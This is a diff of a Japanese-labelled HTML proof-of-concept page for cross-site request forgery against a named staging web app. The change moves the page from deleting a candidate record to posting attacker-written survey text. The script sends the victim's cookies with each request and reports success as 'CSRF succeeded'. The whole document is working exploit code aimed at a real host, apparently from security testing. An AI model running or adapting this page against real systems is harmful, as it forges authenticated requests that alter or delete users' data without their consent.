@@ -2,25 +2,32 @@
 <html>
 <head><meta charset="UTF-8"></head>
 <body>
-<h2>CSRF PoC — DELETE</h2>
+<h2>CSRF PoC — POST surveys</h2>
 <div id="result">送信中...</div>
 
 <script>
 const CANDIDATE_ID = "50591b46-f793-4907-9263-201439a1837a";
-const BASE = "https://lykeion-stg-monte-web-z2u2jj6qsq-an.a.run.app";
+const TARGET = "https://lykeion-stg-monte-web-z2u2jj6qsq-an.a.run.app";
 
-fetch(`${BASE}/api/candidates/${CANDIDATE_ID}`, {
-  method: "DELETE",
+fetch(`${TARGET}/api/candidates/${CANDIDATE_ID}/surveys`, {
+  method: "POST",
   credentials: "include",
   mode: "cors",
-  headers: { "Content-Type": "application/json" }
+  headers: {
+    "Content-Type": "application/x-www-form-urlencoded"
+  },
+  body: "surveyText=%E6%94%BB%E6%92%83%E8%80%85%E3%81%8C%E6%9B%B8%E3%81%84%E3%81%9F%E3%83%86%E3%82%AD%E3%82%B9%E3%83%88"
 })
 .then(r => {
-  document.getElementById("result").textContent
-    = "ステータス: " + r.status + (r.status === 204 ? " → 削除成功 ⚠" : "");
+  const msg = r.status === 200 || r.status === 201
+    ? "⚠ " + r.status + " → CSRF 成立"
+    : "ステータス: " + r.status;
+  document.getElementById("result").textContent = msg;
+  console.log("[CSRF PoC] status:", r.status);
 })
 .catch(e => {
   document.getElementById("result").textContent = "エラー: " + e;
+  console.error(e);
 });
 </script>
 </body>
